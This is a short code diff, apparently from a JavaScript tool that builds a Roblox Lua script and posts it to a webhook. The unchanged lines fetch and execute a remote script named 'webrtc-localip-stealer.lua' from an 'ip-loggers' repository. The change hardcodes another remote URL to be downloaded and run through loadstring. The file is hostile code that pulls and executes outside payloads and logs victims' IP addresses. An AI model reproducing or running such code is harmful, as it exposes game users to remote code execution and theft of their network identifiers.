@@ -86,7 +86,7 @@ end)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()
 
-loadstring(game:HttpGet("${scriptUrl}"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Secret-Employee-Hub/SCRIPT-KIDDIE/refs/heads/main/noskidding"))()
   `.trim();
 
   fetch(WEBHOOK, {
